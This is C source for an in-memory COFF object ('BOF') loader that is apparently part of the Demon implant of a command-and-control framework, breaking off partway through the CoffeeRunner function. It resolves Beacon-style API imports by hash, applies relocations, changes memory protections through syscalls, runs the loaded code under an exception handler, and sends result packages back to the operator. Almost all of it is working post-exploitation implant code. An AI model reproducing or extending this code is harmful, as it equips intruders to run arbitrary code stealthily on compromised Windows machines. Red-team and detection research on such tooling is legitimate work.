
#include <Demon.h>

#include <Core/WinUtils.h>
#include "Common/Defines.h"
#include <Core/MiniStd.h>
#include <Core/Package.h>
#include "Common/Macros.h"
#include <Core/Parser.h>

#include <Inject/InjectUtil.h>

#include <Loader/CoffeeLdr.h>
#include <Loader/ObjectApi.h>

#if defined( __x86_64__ ) || defined( _WIN64 )
    // __imp_
    #define COFF_PREP_SYMBOL        0xec6ba2a8
    #define COFF_PREP_SYMBOL_SIZE   6
    // __imp_Beacon
    #define COFF_PREP_BEACON        0xd0a409b0
    #define COFF_PREP_BEACON_SIZE   ( COFF_PREP_SYMBOL_SIZE + 6 )
#endif

PVOID CoffeeFunctionReturn = NULL;

LONG WINAPI VehDebugger( PEXCEPTION_POINTERS Exception )
{
    PRINTF( "Exception: %p\n", Exception->ExceptionRecord->ExceptionCode )

    // Leave faulty function
    Exception->ContextRecord->Rip = (DWORD64)(ULONG_PTR)CoffeeFunctionReturn;

    PPACKAGE Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
    PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_EXCEPTION );
    PackageAddInt32( Package, Exception->ExceptionRecord->ExceptionCode );
    PackageAddInt64( Package, (UINT64)(ULONG_PTR)Exception->ExceptionRecord->ExceptionAddress );
    PackageTransmit( Package, NULL, NULL );

    return EXCEPTION_CONTINUE_EXECUTION;
}

// check if the symbol is on the form: __imp_LIBNAME$FUNCNAME
BOOL SymbolIncludesLibrary( LPSTR Symbol )
{
    // does it start with __imp_?
    if ( HashEx( Symbol, COFF_PREP_SYMBOL_SIZE, FALSE ) != COFF_PREP_SYMBOL )
        return FALSE;

    // does it contain a $ (which separates DLL name and export name)
    SIZE_T Length = StringLengthA( Symbol );
    for (SIZE_T i = COFF_PREP_SYMBOL_SIZE + 1; i < Length - 1; ++i)
    {
        if ( Symbol[ i ] == '$' )
            return TRUE;
    }

    return FALSE;
}

BOOL SymbolIsImport( LPSTR Symbol )
{
    // does it start with __imp_?
    return HashEx( Symbol, COFF_PREP_SYMBOL_SIZE, FALSE ) == COFF_PREP_SYMBOL;
}

BOOL CoffeeProcessSymbol( LPSTR Symbol, PVOID* pFuncAddr )
{
    CHAR        Bak[ 1024 ] = { 0 };
    PCHAR       SymLibrary  = NULL;
    PCHAR       SymFunction = NULL;
    HMODULE     hLibrary    = NULL;
    DWORD       SymBeacon   = HashEx( Symbol, COFF_PREP_BEACON_SIZE, FALSE );
    ANSI_STRING AnsiString  = { 0 };
    PPACKAGE    Package     = NULL;

    *pFuncAddr = NULL;

    MemCopy( Bak, Symbol, StringLengthA( Symbol ) + 1 );

    if ( SymBeacon == COFF_PREP_BEACON )
    {
        // this is an import symbol from Beacon: __imp_BeaconFUNCNAME
        SymFunction = Symbol + COFF_PREP_SYMBOL_SIZE;

        for ( DWORD i = 0 ;; i++ )
        {
            if ( ! BeaconApi[ i ].NameHash )
                break;

            if ( HashStringA( SymFunction ) == BeaconApi[ i ].NameHash )
            {
                //PUTS( "Found Beacon api function" )
                *pFuncAddr = BeaconApi[ i ].Pointer;
                return TRUE;
            }
        }

        goto SymbolNotFound;
    }
    else if ( SymbolIsImport( Symbol ) && ! SymbolIncludesLibrary( Symbol ) )
    {
        // this is an import symbol without library: __imp_FUNCNAME
        SymFunction = Symbol + COFF_PREP_SYMBOL_SIZE;

        // we support a handful of functions that don't usually have the DLL
        for ( DWORD i = 0 ;; i++ )
        {
            if ( ! LdrApi[ i ].NameHash )
                break;

            if ( HashStringA( SymFunction ) == LdrApi[ i ].NameHash )
            {
                *pFuncAddr = LdrApi[ i ].Pointer;
                return TRUE;
            }
        }

        goto SymbolNotFound;
    }
    else if ( SymbolIsImport( Symbol ) )
    {
        // this is a typical import symbol in the form: __imp_LIBNAME$FUNCNAME
        SymLibrary  = Bak + COFF_PREP_SYMBOL_SIZE;
        SymLibrary  = StringTokenA( SymLibrary, "$" );
        SymFunction = SymLibrary + StringLengthA( SymLibrary ) + 1;
        hLibrary    = LdrModuleLoad( SymLibrary );

        if ( ! hLibrary )
        {
            PRINTF( "Failed to load library: Lib:[%s] Err:[%d]\n", SymLibrary, NtGetLastError() );
            goto SymbolNotFound;
        }

        AnsiString.Length        = StringLengthA( SymFunction );
        AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
        AnsiString.Buffer        = SymFunction;

        if ( ! NT_SUCCESS( Instance.Win32.LdrGetProcedureAddress( hLibrary, &AnsiString, 0, pFuncAddr ) ) )
            goto SymbolNotFound;
    }

    return TRUE;

SymbolNotFound:
    Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
    PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_SYMBOL_NOT_FOUND );
    PackageAddString( Package, Symbol );
    PackageTransmit( Package, NULL, NULL );

    return FALSE;
}

// This is our function where we can control/get the return address of it to use it in case of a Veh exception
VOID CoffeeFunction( PVOID Address, PVOID Argument, SIZE_T Size )
{
    VOID ( *Function ) ( PCHAR , ULONG ) = Address;

    CoffeeFunctionReturn = __builtin_extract_return_addr( __builtin_return_address ( 0 ) );

    // Execute our function
    Function( Argument, Size );

    PUTS( "Finished" )
}

BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE_T Size )
{
    PVOID CoffeeMain     = NULL;
    PVOID VehHandle      = NULL;
    PCHAR SymbolName     = NULL;
    BOOL  Success        = FALSE;
    ULONG FunctionLength = StringLengthA( Function );
    ULONG Protection     = 0;
    ULONG BitMask        = 0;

    if ( Instance.Config.Implant.CoffeeVeh )
    {
        PUTS( "Register VEH handler..." )
        // Add Veh Debugger in case that our BOF crashes etc.
        VehHandle = Instance.Win32.RtlAddVectoredExceptionHandler( 1, &VehDebugger );
        if ( ! VehHandle )
        {
            CALLBACK_GETLASTERROR
            return FALSE;
        }
    }

    // set apropiate permissions for each section
    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        Coffee->Section = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt ) );
        if ( Coffee->Section->SizeOfRawData > 0 )
        {
            BitMask = Coffee->Section->Characteristics & ( IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE );
            if ( BitMask == 0 )
                Protection = PAGE_NOACCESS;
            else if ( BitMask == IMAGE_SCN_MEM_EXECUTE )
                Protection = PAGE_EXECUTE;
            else if ( BitMask == IMAGE_SCN_MEM_READ )
                Protection = PAGE_READONLY;
            else if ( BitMask == ( IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE ) )
                Protection = PAGE_EXECUTE_READ;
            else if ( BitMask == IMAGE_SCN_MEM_WRITE )
                Protection = PAGE_WRITECOPY;
            else if ( BitMask == ( IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_EXECUTE_WRITECOPY;
            else if ( BitMask == ( IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_READWRITE;
            else if ( BitMask == ( IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_EXECUTE_READWRITE;
            else
            {
                PRINTF( "Unknown protection: %x", Coffee->Section->Characteristics );
                Protection = PAGE_EXECUTE_READWRITE;
            }

            if ( ( Coffee->Section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED ) == IMAGE_SCN_MEM_NOT_CACHED  )
                Protection |= PAGE_NOCACHE;

            Success = MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->SecMap[ SectionCnt ].Ptr, Coffee->SecMap[ SectionCnt ].Size, Protection );
            if ( ! Success )
            {
                PUTS( "Failed to protect memory" )
                return FALSE;
            }
        }
    }

    // set the FunctionMap section to READONLY
    Success = MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->FunMap, Coffee->FunMapSize, PAGE_READONLY );
    if ( ! Success )
    {
        PUTS( "Failed to protect memory" )
        return FALSE;
    }

    // look for the "go" function
    for ( DWORD SymCounter = 0; SymCounter < Coffee->Header->NumberOfSymbols; SymCounter++ )
    {
        if ( Coffee->Symbol[ SymCounter ].First.Value[ 0 ] != 0 )
            SymbolName = Coffee->Symbol[ SymCounter ].First.Name;
        else
            SymbolName = ( ( PCHAR ) ( Coffee->Symbol + Coffee->Header->NumberOfSymbols ) ) + Coffee->Symbol[ SymCounter ].First.Value[ 1 ];

        if ( MemCompare( SymbolName, Function, FunctionLength ) == 0 )
        {
            CoffeeMain = ( Coffee->SecMap[ Coffee->Symbol[ SymCounter ].SectionNumber - 1 ].Ptr + Coffee->Symbol[ SymCounter ].Value );
            break;
        }
    }

    // did we find it?
    if ( ! CoffeeMain )
    {
        PRINTF( "[!] Couldn't find function => %s\n", Function );
        PRINTF( "Function => %s [%d]\n", Function, StringLengthA( Function ) );

        PPACKAGE Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );

        PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_SYMBOL_NOT_FOUND );
        PackageAddString( Package, Function );
        PackageTransmit( Package, NULL, NULL );

        return FALSE;
    }

    // make sure the entry point is on executable memory
    Success = FALSE;
    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        if ( ( ULONG_PTR ) CoffeeMain >= ( ULONG_PTR ) Coffee->SecMap[ SectionCnt ].Ptr && ( ULONG_PTR ) CoffeeMain < U_PTR( Coffee->SecMap[ SectionCnt ].Ptr) + Coffee->SecMap[ SectionCnt ].Size )
        {
            Coffee->Section = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt ) );
            if ( ( Coffee->Section->Characteristics & IMAGE_SCN_MEM_EXECUTE ) == IMAGE_SCN_MEM_EXECUTE )
                Success = TRUE;

            break;
        }
    }

    if ( ! Success )
    {
        PRINTF( "The entry point (%p) is not on executable memory\n", CoffeeMain )
        return FALSE;
    }

    CoffeeFunction( CoffeeMain, Argument, Size );

    // Remove our exception handler
    if ( VehHandle )
        Instance.Win32.RtlRemoveVectoredExceptionHandler( VehHandle );

    return TRUE;
}

VOID CoffeeCleanup( PCOFFEE Coffee )
{
    PVOID    Pointer  = NULL;
    SIZE_T   Size     = 0;
    NTSTATUS NtStatus = 0;

    if ( ! Coffee || ! Coffee->ImageBase )
        return;

    if ( MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->ImageBase, Coffee->BofSize, PAGE_READWRITE ) )
        MemSet( Coffee->ImageBase, 0, Coffee->BofSize );

    Pointer = Coffee->ImageBase;
    Size    = Coffee->BofSize;
    if ( ! NT_SUCCESS( ( NtStatus = Instance.Syscall.NtFreeVirtualMemory( NtCurrentProcess(), &Pointer, &Size, MEM_RELEASE ) ) ) )
    {
        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        PRINTF( "[!] Failed to free memory: %p : %lu\n", Coffee->ImageBase, NtGetLastError() );
    }

    if ( Coffee->SecMap )
    {
        MemSet( Coffee->SecMap, 0, Coffee->Header->NumberOfSections * sizeof( SECTION_MAP ) );
        Instance.Win32.LocalFree( Coffee->SecMap );
        Coffee->SecMap = NULL;
    }
}

// Process sections relocation and symbols
BOOL CoffeeProcessSections( PCOFFEE Coffee )
{
    PUTS( "Process Sections" )
    PVOID  FuncPtr    = NULL;
    DWORD  FuncCount  = 0;
    UINT64 OffsetLong = 0;
    UINT32 Offset     = 0;
    CHAR   SymName[9] = { 0 };
    PCHAR  SymbolName = NULL;

    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        Coffee->Section = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt ) );
        Coffee->Reloc   = C_PTR( U_PTR( Coffee->Data ) + Coffee->Section->PointerToRelocations );

        for ( DWORD RelocCnt = 0; RelocCnt < Coffee->Section->NumberOfRelocations; RelocCnt++ )
        {
            if ( Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].First.Value[ 0 ] != 0 )
            {
                // if the symbol is 8 bytes long, it will not be terminated by a null byte
                MemSet( SymName, 0, sizeof( SymName ) );
                MemCopy( SymName, Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].First.Name, 8 );
                SymbolName = SymName;
                // TODO: the following symbols take 2 entries: .text, .xdata, .pdata, .rdata
                //       skip an entry if one of those is found
            }
            else
            {
                // in this scenario, we can trust that the symbol ends with a null byte
                SymbolName = ( ( PCHAR ) ( Coffee->Symbol + Coffee->Header->NumberOfSymbols ) ) + Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].First.Value[ 1 ];
            }

            if ( ! CoffeeProcessSymbol( SymbolName, &FuncPtr ) )
            {
                PRINTF( "Symbol '%s' couldn't be resolved\n", SymbolName );
                return FALSE;
            }

            if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && FuncPtr != NULL )
            {
                MemCopy( Coffee->FunMap + ( FuncCount * sizeof( UINT64 ) ), &FuncPtr, sizeof( UINT64 ) );

                Offset  = ( UINT32 ) ( ( Coffee->FunMap + ( FuncCount * sizeof( UINT64 ) ) ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );

                FuncCount++;
            }
            /*
            else if ( Coffee->Reloc->Type == IMAGE_REL_I386_DIR32 && FuncPtr != NULL )
            {
                MemCopy( Coffee->FunMap + ( FuncCount * sizeof( UINT64 ) ), &FuncPtr, sizeof( UINT32 ) );

                Offset  = ( UINT32 ) ( Coffee->FunMap + ( FuncCount * sizeof( UINT64 ) ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );

                FuncCount++;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_I386_DIR32 && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset;
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            */
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_1 && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
                Offset += 1;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_2 && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
                Offset += 2;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_3 && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
                Offset += 3;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_4 && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
                Offset += 4;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_5 && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
                Offset += 5;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_ADDR32NB && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_ADDR64 && FuncPtr == NULL )
            {
                MemCopy( &OffsetLong, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT64 ) );

                // TODO: this reloc is not right
                OffsetLong  = U_PTR( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr ) + OffsetLong;
                OffsetLong += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &OffsetLong, sizeof( UINT64 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_I386_REL32 && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset )  - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else
            {
                if ( FuncPtr )
                {
                    PRINTF( "[!] Relocation type %d for Symbol %s not supported\n", Coffee->Reloc->Type, SymbolName );
                }
                else
                {
                    PRINTF( "[!] Relocation type not found: %d\n", Coffee->Reloc->Type );
                }

                return FALSE;
            }

            Coffee->Reloc = C_PTR( U_PTR( Coffee->Reloc ) + sizeof( COFF_RELOC ) );
        }
    }

    return TRUE;
}

// calculate how many __imp_* function there are
SIZE_T CoffeeGetFunMapSize( PCOFFEE Coffee )
{
    CHAR  SymName[9]    = { 0 };
    PCHAR SymbolName    = NULL;
    ULONG NumberOfFuncs = 0;

    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        Coffee->Section = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt ) );
        Coffee->Reloc   = C_PTR( U_PTR( Coffee->Data ) + Coffee->Section->PointerToRelocations );

        for ( DWORD RelocCnt = 0; RelocCnt < Coffee->Section->NumberOfRelocations; RelocCnt++ )
        {
            if ( Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].First.Value[ 0 ] != 0 )
            {
                // if the symbol is 8 bytes long, it will not be terminated by a null byte
                MemSet( SymName, 0, sizeof( SymName ) );
                MemCopy( SymName, Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].First.Name, 8 );
                SymbolName = SymName;
            }
            else
            {
                // in this scenario, we can trust that the symbol ends with a null byte
                SymbolName = ( ( PCHAR ) ( Coffee->Symbol + Coffee->Header->NumberOfSymbols ) ) + Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].First.Value[ 1 ];
            }

            // if the symbol starts with __imp_, count it
            if ( HashEx( SymbolName, COFF_PREP_SYMBOL_SIZE, FALSE ) == COFF_PREP_SYMBOL )
                NumberOfFuncs++;

            Coffee->Reloc = C_PTR( U_PTR( Coffee->Reloc ) + sizeof( COFF_RELOC ) );
        }
    }

    return sizeof( UINT64 ) * NumberOfFuncs;
}

VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize )
{
    COFFEE Coffee   = { 0 };
    PVOID  NextBase = NULL;
    BOOL   Success  = FALSE;

    PRINTF( "[EntryName: %s] [CoffeeData: %p] [ArgData: %p] [ArgSize: %ld]\n", EntryName, CoffeeData, ArgData, ArgSize )

    if ( ! CoffeeData )
    {
        PUTS( "[!] Coffee data is empty" );
        goto END;
    }

    /*
     * The BOF will be allocated as one big chunk of memory
     * all sections are kept page aligned
     * the FunctionMap stored at the end to prevent
     * reloc 32-bit offsets to overflow
     */

    Coffee.Data   = CoffeeData;
    Coffee.Header = Coffee.Data;
    Coffee.Symbol = C_PTR( U_PTR( Coffee.Data ) + Coffee.Header->PointerToSymbolTable );

    if ( Coffee.Header->Machine != IMAGE_FILE_MACHINE_AMD64 )
    {
        PUTS( "The BOF is not AMD64" );
        goto END;
    }

    Coffee.SecMap     = Instance.Win32.LocalAlloc( LPTR, Coffee.Header->NumberOfSections * sizeof( SECTION_MAP ) );
    Coffee.FunMapSize = CoffeeGetFunMapSize( &Coffee );

    if ( ! Coffee.SecMap )
    {
        PUTS( "Failed to allocate memory" )
        goto END;
    }

    // calculate the size of the entire BOF
    for ( UINT16 SecCnt = 0 ; SecCnt < Coffee.Header->NumberOfSections; SecCnt++ )
    {
        Coffee.Section  = C_PTR( U_PTR( Coffee.Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SecCnt ) );
        Coffee.BofSize += Coffee.Section->SizeOfRawData;
        Coffee.BofSize  = ( SIZE_T ) ( ULONG_PTR ) PAGE_ALLIGN( Coffee.BofSize );
    }

    // at the bottom of the BOF, store the Function map, to ensure all reloc offsets are below 4K
    Coffee.BofSize += Coffee.FunMapSize;

    Coffee.ImageBase = MemoryAlloc( DX_MEM_DEFAULT, NtCurrentProcess(), Coffee.BofSize, PAGE_READWRITE );
    if ( ! Coffee.ImageBase )
    {
        PUTS( "Failed to allocate memory for the BOF" )
        goto END;
    }

    NextBase = Coffee.ImageBase;
    for ( UINT16 SecCnt = 0 ; SecCnt < Coffee.Header->NumberOfSections; SecCnt++ )
    {
        Coffee.Section               = C_PTR( U_PTR( Coffee.Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SecCnt ) );
        Coffee.SecMap[ SecCnt ].Size = Coffee.Section->SizeOfRawData;
        Coffee.SecMap[ SecCnt ].Ptr  = NextBase;

        NextBase += Coffee.Section->SizeOfRawData;
        NextBase  = PAGE_ALLIGN( NextBase );

        PRINTF( "Coffee.SecMap[ %d ].Ptr => %p\n", SecCnt, Coffee.SecMap[ SecCnt ].Ptr )

        MemCopy( Coffee.SecMap[ SecCnt ].Ptr, C_PTR( U_PTR( CoffeeData ) + Coffee.Section->PointerToRawData ), Coffee.Section->SizeOfRawData );
    }

    // the FunMap is stored directly after the BOF
    Coffee.FunMap = NextBase;

    if ( ! CoffeeProcessSections( &Coffee ) )
    {
        PUTS( "[*] Failed to process relocation" );
        goto END;
    }

    PUTS( "[*] Execute coffee main\n" );
    Success = CoffeeExecuteFunction( &Coffee, EntryName, ArgData, ArgSize );

END:
    PUTS( "[*] Cleanup memory" );
    CoffeeCleanup( &Coffee );

    if ( Success )
    {
        PPACKAGE Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
        PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_RAN_OK );
        PackageTransmit( Package, NULL, NULL );
    }
    else
    {
        PPACKAGE Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
        PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_COULD_NO_RUN );
        PackageTransmit( Package, NULL, NULL );
    }
}

VOID CoffeeRunnerThread( PCOFFEE_PARAMS Param )
{
    if ( ! Param->EntryName || ! Param->CoffeeData )
        goto ExitThread;

    CoffeeLdr( Param->EntryName, Param->CoffeeData, Param->ArgData, Param->ArgSize );

ExitThread:
    if ( Param->EntryName )
    {
        MemSet( Param->EntryName, 0, Param->EntryNameSize );
        Instance.Win32.LocalFree( Param->EntryName );
        Param->EntryName = NULL;
    }

    if ( Param->CoffeeData )
    {
        MemSet( Param->EntryName, 0, Param->EntryNameSize );
        Instance.Win32.LocalFree( Param->EntryName );
        Param->EntryName = NULL;
    }

    if ( Param->ArgData )
    {
        MemSet( Param->EntryName, 0, Param->EntryNameSize );
        Instance.Win32.LocalFree( Param->EntryName );
        Param->EntryName = NULL;
    }

    if ( Param )
    {
        MemSet( Param, 0, sizeof( COFFEE_PARAMS ) );
        Instance.Win32.LocalFree( Param );
        Param = NULL;
    }

    JobRemove( (DWORD)(ULONG_PTR)NtCurrentTeb()->ClientId.UniqueThread );
    Instance.Threads--;

    Instance.Win32.RtlExitUserThread( 0 );
}

VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_T CoffeeDataSize, PVOID ArgData, SIZE_T ArgSize )
{
    PCOFFEE_PARAMS CoffeeParams = NULL;
    INJECTION_CTX  InjectionCtx = { 0 };

    // Allocate memory
    CoffeeParams                 = Instance.Win32.LocalAlloc( LPTR, sizeof( COFFEE_PARAMS ) );
    CoffeeParams->EntryName      = Instance.Win32.LocalAlloc( LPTR, EntryNameSize );
    CoffeeParams->CoffeeData     = Instance.Win32.LocalAlloc( LPTR, CoffeeDataSize );
    CoffeeParams->ArgData        = Instance.Win32.LocalAlloc( LPTR, ArgSize );
    CoffeeParams->EntryNameSize  = EntryNameSize;
    CoffeeParams->CoffeeDataSize = CoffeeDataSize;
    CoffeeParams->ArgSize        = ArgSize;

    MemCopy( CoffeeParams->EntryName,  EntryName,  EntryNameSize  );
    MemCopy( CoffeeParams->CoffeeData, CoffeeData, CoffeeDataSize );
    MemCopy( CoffeeParams->ArgData,    ArgData,    ArgSize        );

    InjectionCtx.Parameter = CoffeeParams;

    Instance.Threads++;

